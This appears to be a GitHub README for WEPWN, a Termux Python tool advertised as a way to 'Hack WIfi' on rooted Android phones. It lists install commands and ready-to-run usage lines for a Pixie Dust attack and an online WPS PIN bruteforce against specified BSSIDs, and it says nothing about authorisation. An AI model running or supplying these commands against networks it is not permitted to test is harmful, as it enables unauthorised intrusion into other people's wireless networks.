<h1 align="center">WEPWN</h1>
<h4 align="center">Hack WIfi Using Termux! (Requires Root)</h4>

#### Start

<p align="center"><img src="https://raw.githubusercontent.com/ITSN0B1T4/itsn0b1t4.github.io/main/wepwn/.assets/demo2.png"></p>

#### Cracked

<p align="center"><img src="https://raw.githubusercontent.com/ITSN0B1T4/itsn0b1t4.github.io/main/wepwn/.assets/demo3.png"></p>

#### Autostart if failed 

<p align="center"><img src="https://raw.githubusercontent.com/ITSN0B1T4/itsn0b1t4.github.io/main/wepwn/.assets/demo4.png"></p>

### Installation :

```bash
pkg update && pkg upgrade -y
pkg install root-repo -y
pkg install git tsu python termux-api wpa-supplicant pixiewps iw -y
git clone https://github.com/ITSN0B1T4/wepwn
cd wepwn
chmod +x wepwn.py
```
#### Help : `sudo python wepwn.py --help`
#### Example : `sudo python wepwn.py -i wlan0 -K`

#### Note: 
+ **First turn off your Wifi.**
+ **Turn on Hotspot.**
- Show avaliable networks and start Pixie Dust attack on a specified network.
- `sudo python wepwn.py -i wlan0 -K`
- - Start Pixie Dust attack on a specified BSSID:
`sudo python wepwn.py -i wlan0 -b 00:91:4C:C3:AC:28 -K`
- Launch online WPS bruteforce with the specified first half of the PIN:
- `sudo python wepwn.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234`
### Troubleshooting
**"Device or resource busy (-16)" - Turn on Wifi and Then Turn off Wifi.**

### License

````
MIT License

Copyright (c) 2022 Toxinum.

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
````

+ **IF FAILED TURN OFF LOCATION IF TURNED ON.**

Repo : <a href="https://github.com/ITSN0B1T4/wepwn"> Here </a>
